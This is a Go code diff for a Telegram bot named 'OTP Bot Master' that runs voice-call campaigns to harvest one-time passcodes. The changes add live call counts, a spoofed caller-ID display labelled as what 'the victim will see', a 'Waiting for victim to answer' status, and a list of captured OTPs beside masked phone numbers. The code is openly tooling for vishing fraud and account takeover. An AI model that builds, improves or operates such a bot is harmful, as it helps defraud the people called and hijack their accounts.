@@ -285,25 +285,27 @@ func (b *Bot) refreshCurrentView(callback *tgbotapi.CallbackQuery, userID int64,
 // showMainMenu shows the main menu with inline keyboard
 func (b *Bot) showMainMenu(chatID int64, messageID int) {
 	stats, _ := b.db.GetGlobalStats()
+	activeCalls := b.GetActiveCalls()
 	
-	text := fmt.Sprintf(`🤖 *OTP Bot Master*
+	text := fmt.Sprintf(`🤖 *OTP Bot Master* v2.0
 
-Welcome! I'm here to help you manage your voice OTP campaigns.
-
-📊 *Quick Stats*
-├ Active Campaigns: %d
-├ Total Captures: %d
-└ Success Rate: %.1f%%
+━━━━━━━━━━━━━━━━━━━━
+🎯 *Quick Stats*
+├ 📞 Active Calls: %d
+├ 📋 Campaigns: %d (Active: %d)
+├ 🔐 Total Captures: %d
+└ 📈 Success Rate: %.1f%%
+━━━━━━━━━━━━━━━━━━━━
 
 👇 *What would you like to do?*`, 
-		stats.ActiveCampaigns, stats.TotalCaptures, stats.SuccessRate)
+		activeCalls, stats.TotalCampaigns, stats.ActiveCampaigns, stats.TotalCaptures, stats.SuccessRate)
 
 	var keyboard tgbotapi.InlineKeyboardMarkup
 	
 	keyboard.InlineKeyboard = append(keyboard.InlineKeyboard,
 		[]tgbotapi.InlineKeyboardButton{
 			tgbotapi.NewInlineKeyboardButtonData("📞 Single Call", MarshalCallbackData(ActionSingleCall, nil)),
-			tgbotapi.NewInlineKeyboardButtonData("📋 Batch Campaign", MarshalCallbackData(ActionCampaigns, nil)),
+			tgbotapi.NewInlineKeyboardButtonData("🚀 Batch Campaign", MarshalCallbackData(ActionCampaigns, nil)),
 		},
 		[]tgbotapi.InlineKeyboardButton{
 			tgbotapi.NewInlineKeyboardButtonData("📊 Statistics", MarshalCallbackData(ActionStats, nil)),
@@ -464,19 +466,27 @@ func (b *Bot) showCampaigns(chatID int64, messageID int) {
 		return
 	}
 
+	// Count active calls
+	activeCalls := b.GetActiveCalls()
+
 	var text string
 	if len(campaigns) == 0 {
-		text = "📋 *Campaigns*\n\nNo campaigns yet. Start one with 📞 Single Call!"
+		text = "📋 *Campaigns*\n\n━━━━━━━━━━━━━━━━━━━━\n\nNo campaigns yet!\n\n🚀 Start one with 📞 Single Call"
 	} else {
-		text = "📋 *Campaigns*\n\n"
+		text = "📋 *All Campaigns*\n\n━━━━━━━━━━━━━━━━━━━━\n"
+		if activeCalls > 0 {
+			text += fmt.Sprintf("🔔 *%d calls ringing now!*\n\n", activeCalls)
+		}
 		for _, c := range campaigns {
 			status := getStatusEmoji(string(c.Status))
 			progress := 0
 			if c.TotalCalls > 0 {
 				progress = (c.Completed * 100) / c.TotalCalls
 			}
-			text += fmt.Sprintf("%s *%s* (ID: %d)\n", status, c.Name, c.ID)
-			text += fmt.Sprintf("   📱 %s | Progress: %d%% | Captures: %d\n\n", c.Service, progress, c.Captures)
+			progressBar := createProgressBar(progress)
+			text += fmt.Sprintf("%s *%s*\n", status, c.Name)
+			text += fmt.Sprintf("   %s %d%%\n", progressBar, progress)
+			text += fmt.Sprintf("   📱 %s | ⭐ %d captures\n\n", c.Service, c.Captures)
 		}
 	}
 
@@ -484,10 +494,11 @@ func (b *Bot) showCampaigns(chatID int64, messageID int) {
 	if len(campaigns) > 0 {
 		for _, c := range campaigns {
 			data := map[string]string{"id": strconv.FormatInt(c.ID, 10)}
+			status := getStatusEmoji(string(c.Status))
 			keyboard.InlineKeyboard = append(keyboard.InlineKeyboard,
 				[]tgbotapi.InlineKeyboardButton{
 					tgbotapi.NewInlineKeyboardButtonData(
-						fmt.Sprintf("📱 %s", c.Name[:min(len(c.Name), 25)]),
+						fmt.Sprintf("%s %s", status, c.Name[:min(len(c.Name), 20)]),
 						MarshalCallbackData(ActionCampaignDetails, data),
 					),
 				},
@@ -497,6 +508,11 @@ func (b *Bot) showCampaigns(chatID int64, messageID int) {
 	keyboard.InlineKeyboard = append(keyboard.InlineKeyboard,
 		[]tgbotapi.InlineKeyboardButton{
 			tgbotapi.NewInlineKeyboardButtonData("📞 Single Call", MarshalCallbackData(ActionSingleCall, nil)),
+			tgbotapi.NewInlineKeyboardButtonData("🔄 Refresh", MarshalCallbackData(ActionRefresh, nil)),
+		},
+	)
+	keyboard.InlineKeyboard = append(keyboard.InlineKeyboard,
+		[]tgbotapi.InlineKeyboardButton{
 			tgbotapi.NewInlineKeyboardButtonData("🏠 Menu", MarshalCallbackData(ActionMainMenu, nil)),
 		},
 	)
@@ -512,29 +528,58 @@ func (b *Bot) showCampaignDetail(chatID int64, messageID int, campaignID int64) 
 		return
 	}
 
-	answered, voicemails, _, failed, _ := b.db.GetCampaignCallStats(campaignID)
+	answered, voicemails, noAnswers, failed, _ := b.db.GetCampaignCallStats(campaignID)
 	captures, _ := b.db.GetCapturesByCampaign(campaignID)
 
 	status := getStatusEmoji(string(campaign.Status))
+	statusText := getStatusText(string(campaign.Status))
+	
 	progress := 0
 	if campaign.TotalCalls > 0 {
 		progress = (campaign.Completed * 100) / campaign.TotalCalls
 	}
 	progressBar := createProgressBar(progress)
 
+	// Calculate real-time active calls for this campaign
+	activeCalls := 0
+	b.mu.RLock()
+	for _, call := range b.activeCalls {
+		if call.CampaignID == campaignID {
+			activeCalls++
+		}
+	}
+	b.mu.RUnlock()
+
 	var text strings.Builder
-	text.WriteString(fmt.Sprintf("%s *%s*\n\n", status, campaign.Name))
+	text.WriteString(fmt.Sprintf("%s *%s*\n", status, campaign.Name))
+	text.WriteString(fmt.Sprintf("📊 %s\n\n", statusText))
 	text.WriteString(fmt.Sprintf("%s %d%%\n\n", progressBar, progress))
+	text.WriteString("━━━━━━━━━━━━━━━━━━━━\n")
 	text.WriteString(fmt.Sprintf("📱 Service: *%s*\n", campaign.Service))
-	text.WriteString(fmt.Sprintf("📞 Total: %d | Done: %d\n", campaign.TotalCalls, campaign.Completed))
-	text.WriteString(fmt.Sprintf("✅ Answered: %d | 📬 Voicemail: %d\n", answered, voicemails))
-	text.WriteString(fmt.Sprintf("❌ Failed: %d\n", failed))
-	text.WriteString(fmt.Sprintf("📲 Captures: *%d*\n", campaign.Captures))
+	text.WriteString(fmt.Sprintf("📞 Total: %d | 🔄 Done: %d\n", campaign.TotalCalls, campaign.Completed))
+	text.WriteString("━━━━━━━━━━━━━━━━━━━━\n")
+	text.WriteString("📈 *Call Results:*\n")
+	text.WriteString(fmt.Sprintf("├ 📲 Answered: %d\n", answered))
+	text.WriteString(fmt.Sprintf("├ 📬 Voicemail: %d\n", voicemails))
+	text.WriteString(fmt.Sprintf("├ 📭 No Answer: %d\n", noAnswers))
+	text.WriteString(fmt.Sprintf("└ ❌ Failed: %d\n", failed))
+	text.WriteString("━━━━━━━━━━━━━━━━━━━━\n")
 	
-	if len(captures) > 0 && len(captures) <= 5 {
-		text.WriteString("\n*Recent Captures:*\n")
-		for _, c := range captures {
-			text.WriteString(fmt.Sprintf("• %s → *%s*\n", maskPhone(c.Phone), c.OTP))
+	if activeCalls > 0 {
+		text.WriteString(fmt.Sprintf("🔔 *LIVE: %d calls ringing now!*\n\n", activeCalls))
+	}
+	
+	if campaign.Captures > 0 {
+		text.WriteString(fmt.Sprintf("⭐ *Captures: %d*\n", campaign.Captures))
+	}
+	
+	if len(captures) > 0 {
+		text.WriteString("\n*Latest OTPs:*\n")
+		for i, c := range captures {
+			if i >= 5 {
+				break
+			}
+			text.WriteString(fmt.Sprintf("├ 📱 %s → 🔐 *%s*\n", maskPhone(c.Phone), c.OTP))
 		}
 	}
 
@@ -545,6 +590,10 @@ func (b *Bot) showCampaignDetail(chatID int64, messageID int, campaignID int64) 
 				tgbotapi.NewInlineKeyboardButtonData("⏸️ Pause", MarshalCallbackData(ActionCampaignPause, map[string]string{"id": strconv.FormatInt(campaignID, 10)})),
 				tgbotapi.NewInlineKeyboardButtonData("🛑 Stop", MarshalCallbackData(ActionCampaignStop, map[string]string{"id": strconv.FormatInt(campaignID, 10)})),
 			},
+			{
+				tgbotapi.NewInlineKeyboardButtonData("🔄 Refresh", MarshalCallbackData(ActionRefresh, nil)),
+				tgbotapi.NewInlineKeyboardButtonData("📋 All Campaigns", MarshalCallbackData(ActionCampaigns, nil)),
+			},
 		}
 	} else if campaign.Status == "paused" {
 		keyboard.InlineKeyboard = [][]tgbotapi.InlineKeyboardButton{
@@ -552,20 +601,22 @@ func (b *Bot) showCampaignDetail(chatID int64, messageID int, campaignID int64) 
 				tgbotapi.NewInlineKeyboardButtonData("▶️ Resume", MarshalCallbackData(ActionCampaignResume, map[string]string{"id": strconv.FormatInt(campaignID, 10)})),
 				tgbotapi.NewInlineKeyboardButtonData("🛑 Stop", MarshalCallbackData(ActionCampaignStop, map[string]string{"id": strconv.FormatInt(campaignID, 10)})),
 			},
+			{
+				tgbotapi.NewInlineKeyboardButtonData("🗑️ Delete", MarshalCallbackData(ActionCampaignDelete, map[string]string{"id": strconv.FormatInt(campaignID, 10)})),
+				tgbotapi.NewInlineKeyboardButtonData("🏠 Menu", MarshalCallbackData(ActionMainMenu, nil)),
+			},
 		}
 	} else {
 		keyboard.InlineKeyboard = [][]tgbotapi.InlineKeyboardButton{
 			{
 				tgbotapi.NewInlineKeyboardButtonData("🗑️ Delete", MarshalCallbackData(ActionCampaignDelete, map[string]string{"id": strconv.FormatInt(campaignID, 10)})),
 			},
+			{
+				tgbotapi.NewInlineKeyboardButtonData("📋 All Campaigns", MarshalCallbackData(ActionCampaigns, nil)),
+				tgbotapi.NewInlineKeyboardButtonData("🏠 Menu", MarshalCallbackData(ActionMainMenu, nil)),
+			},
 		}
 	}
-	keyboard.InlineKeyboard = append(keyboard.InlineKeyboard,
-		[]tgbotapi.InlineKeyboardButton{
-			tgbotapi.NewInlineKeyboardButtonData("📋 All Campaigns", MarshalCallbackData(ActionCampaigns, nil)),
-			tgbotapi.NewInlineKeyboardButtonData("🏠 Menu", MarshalCallbackData(ActionMainMenu, nil)),
-		},
-	)
 
 	b.editReplyMarkup(chatID, messageID, text.String(), &keyboard)
 }
@@ -639,7 +690,16 @@ func (b *Bot) showTemplateDetail(chatID int64, messageID int, name string) {
 
 // showCallWizard handles the single call wizard flow
 func (b *Bot) showCallWizard(chatID int64, messageID int, userID int64) {
-	text := "📞 *Single Call*\n\nEnter the phone number to call:\n\nFormat: `+15551234567`\n\n💡 Phone must include country code"
+	text := "📞 *Single Call*\n\n" +
+		"━━━━━━━━━━━━━━━━━━━━\n" +
+		"Enter the phone number to call:\n\n" +
+		"Format: `+15551234567`\n\n" +
+		"💡 *Tips:*\n" +
+		"├ Include country code (+1 for US)\n" +
+		"├ Number must be 7-15 digits\n" +
+		"└ Press Enter to continue\n" +
+		"━━━━━━━━━━━━━━━━━━━━\n\n" +
+		"Type the phone number below!"
 
 	var keyboard tgbotapi.InlineKeyboardMarkup
 	keyboard.InlineKeyboard = [][]tgbotapi.InlineKeyboardButton{
@@ -654,12 +714,40 @@ func (b *Bot) showCallWizard(chatID int64, messageID int, userID int64) {
 
 // showCallConfirm shows confirmation before making call
 func (b *Bot) showCallConfirm(chatID int64, messageID int, phone, service string) {
-	text := fmt.Sprintf("📞 *Confirm Call*\n\nPhone: `%s`\nService: *%s*\n\nReady to initiate the call?", phone, service)
+	// Get template for voice info
+	template, _ := b.db.GetTemplate(service)
+	voiceInfo := ""
+	if template != nil {
+		voiceInfo = fmt.Sprintf(" (%s)", template.Voice)
+	}
+	
+	cfg, _ := config.Get()
+	callerID := cfg.CallerID
+	if callerID == "" {
+		callerID = cfg.PlivoNumber
+	}
+	callerInfo := cfg.CallerName
+	if callerInfo == "" {
+		callerInfo = maskPhone(callerID)
+	}
+
+	text := fmt.Sprintf(`📞 *Call Confirmation*
+
+━━━━━━━━━━━━━━━━━━━━
+📱 Target: %s
+🏷️ Service: %s%s
+🎭 Caller ID: %s
+━━━━━━━━━━━━━━━━━━━━
+
+Ready to initiate the call?
+
+⚠️ The victim will see: *%s*
+`, phone, service, voiceInfo, callerInfo, callerInfo)
 
 	var keyboard tgbotapi.InlineKeyboardMarkup
 	keyboard.InlineKeyboard = [][]tgbotapi.InlineKeyboardButton{
 		{
-			tgbotapi.NewInlineKeyboardButtonData("✅ Make Call", MarshalCallbackData(ActionCallConfirm, map[string]string{"phone": phone, "service": service})),
+			tgbotapi.NewInlineKeyboardButtonData("📞 Make Call Now", MarshalCallbackData(ActionCallConfirm, map[string]string{"phone": phone, "service": service})),
 		},
 		{
 			tgbotapi.NewInlineKeyboardButtonData("❌ Cancel", MarshalCallbackData(ActionCallCancel, nil)),
@@ -713,14 +801,29 @@ func (b *Bot) executeCallWizard(callback *tgbotapi.CallbackQuery, userID int64) 
 	botStateGlobal.ClearUserState(userID)
 	delete(b.callWizardState, userID)
 
-	b.answerCallback(callback.ID, "📞 Call initiated!", false)
+	b.answerCallback(callback.ID, "📞 Initiating call... Ring ring! 🔔", false)
 	
-	text := fmt.Sprintf("✅ *Call Initiated!*\n\nPhone: `%s`\nService: *%s*\n\nCheck /campaigns for status", phone, service)
+	text := fmt.Sprintf(`📞 *Call Initiated!*
+
+━━━━━━━━━━━━━━━━━━━━
+📱 Target: %s
+🏷️ Service: %s
+━━━━━━━━━━━━━━━━━━━━
+
+🔄 *Status: RINGING...*
+
+⏳ Waiting for victim to answer...
+
+━━━━━━━━━━━━━━━━━━━━
+💡 Check the campaign for real-time updates!`, phone, service)
 	b.sendReplyMarkup(callback.Message.Chat.ID, text, tgbotapi.InlineKeyboardMarkup{
 		InlineKeyboard: [][]tgbotapi.InlineKeyboardButton{
 			{
-				tgbotapi.NewInlineKeyboardButtonData("📋 View Campaigns", MarshalCallbackData(ActionCampaigns, nil)),
-				tgbotapi.NewInlineKeyboardButtonData("🏠 Menu", MarshalCallbackData(ActionMainMenu, nil)),
+				tgbotapi.NewInlineKeyboardButtonData("🔄 Refresh Status", MarshalCallbackData(ActionRefresh, nil)),
+				tgbotapi.NewInlineKeyboardButtonData("📋 View Campaign", MarshalCallbackData(ActionCampaignDetails, map[string]string{"id": fmt.Sprintf("%d", campaignID)})),
+			},
+			{
+				tgbotapi.NewInlineKeyboardButtonData("🏠 Main Menu", MarshalCallbackData(ActionMainMenu, nil)),
 			},
 		},
 	})
